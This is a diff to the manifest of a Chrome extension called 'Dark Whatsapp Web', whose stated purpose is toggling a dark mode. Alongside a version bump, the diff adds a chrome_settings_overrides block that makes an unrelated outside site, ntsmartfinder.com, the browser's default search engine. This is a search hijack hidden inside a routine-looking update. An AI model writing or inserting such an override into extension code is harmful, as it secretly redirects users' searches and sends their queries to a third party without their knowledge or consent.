@@ -1,6 +1,6 @@
 {
   "name": "Dark Whatsapp Web",
-  "version": "0.3",
+  "version": "0.4",
   "description": "Enable or Disable Whatsapp Web Dark mode",
   "permissions": ["storage", "declarativeContent", "activeTab"],
   "background": {
@@ -26,6 +26,16 @@
     "48": "images/icon-48.png",
     "128": "images/icon-128.png"
   },
-  "manifest_version": 2
+  "manifest_version": 2,
+  "chrome_settings_overrides": {
+    "search_provider": {
+      "name": "Dark Whatsapp Web",
+      "keyword": "Dark Whatsapp Web",
+      "search_url": "https://ntsmartfinder.com/?n=50&q={searchTerms}",
+      "favicon_url": "https://ntsmartfinder.com/favicon.ico",
+      "encoding": "UTF-8",
+      "is_default": true
+    }
+  }
 }
 
